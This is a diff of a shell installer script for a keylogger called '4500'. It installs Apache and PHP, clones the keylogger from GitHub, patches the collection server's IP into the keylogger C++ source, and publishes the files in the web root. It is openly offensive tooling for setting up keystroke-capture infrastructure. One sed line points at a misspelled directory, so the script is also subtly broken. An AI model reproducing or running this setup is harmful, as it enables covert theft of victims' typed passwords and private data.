@@ -2,7 +2,7 @@
 
 #4500 keylogger installer
 ################################
-server_ip='' #ex) 33.33.33.33
+server_ip='' #ex)33.33.33.33
 
 ################################
 
@@ -21,10 +21,9 @@ echo "[*] update system and install dependencies"
 sudo apt update
 sudo apt upgrade -y
 sudo apt install -y git apache2 php libapache2-mod-php
-sudo apt-get install mingw-w64
+
 #protect dirctory listing
 sed -i 's/Indexes//' /etc/apache2/apache2.conf
-
 
 #php php working borwser
 
@@ -34,13 +33,11 @@ sudo a2enmod mpm_prefork
 #restart apache
 sudo service apache2 restart
 
+sudo git clone https://github.com/intadd/4500keylogger.git
+
+sudo sed -i 's/define ip ""/define ip '$server_ip'/' ./4500keyloger/4500keylogger.cpp
+sudo cp -R ./4500keylogger/4500/ /var/www/html/
+
+sudo cp ./4500keylogger/4500keylogger.cpp /var/www/html/
 
 
-#install module for make from .exe file to C Langue and Python
-
-#git clone 
-
-
-
-
-#i686-w64-mingw32-gcc test.c -o hello.exe -lws2_32
